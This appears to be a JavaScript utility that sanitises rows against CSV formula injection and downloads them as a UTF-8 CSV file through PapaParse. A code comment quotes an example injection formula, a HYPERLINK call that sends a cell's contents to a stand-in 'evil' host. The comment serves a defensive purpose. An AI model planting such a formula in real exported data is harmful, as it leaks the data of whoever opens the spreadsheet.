import Papa from 'papaparse';
 
// CSV injection ("formula injection").
//
// Papa.unparse quotes and escapes correctly for the CSV *format*, but a cell
// whose text begins with = + - @ or a control character is interpreted by
// Excel, LibreOffice and Google Sheets as a formula when the file is opened.
// A company name saved as
//     =HYPERLINK("https://evil/?d="&A1,"Click")
// therefore runs on the accountant's machine, not ours — the export is the
// delivery mechanism.
//
// Prefixing with a single quote is the standard neutralisation: spreadsheets
// treat the cell as text and do not display the quote.
const RISKY_START = /^[=+\-@\t\r]/;
 
function neutralise(value) {
  if (value == null) return '';
  const s = String(value);
  return RISKY_START.test(s) ? `'${s}` : s;
}
 
/** Apply the guard to every cell of every row. */
export function sanitiseRows(rows) {
  return rows.map((row) =>
    Object.fromEntries(Object.entries(row).map(([k, v]) => [k, neutralise(v)]))
  );
}
 
/**
 * Build a CSV and hand it to the browser as a download.
 *
 * @param {Array<object>} rows      already in display order and shape
 * @param {string} filename         without the .csv extension
 */
export function downloadCsv(rows, filename) {
  const csv = Papa.unparse(sanitiseRows(rows));
  // The BOM is what makes Excel read the file as UTF-8; without it, Odia and
  // Hindi text and the ₹ sign arrive as mojibake.
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${filename}.csv`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  // Revoking in the same tick can cancel the download in Safari and Firefox.
  setTimeout(() => URL.revokeObjectURL(url), 1000);
}
 
export const stamp = () => new Date().toISOString().slice(0, 10);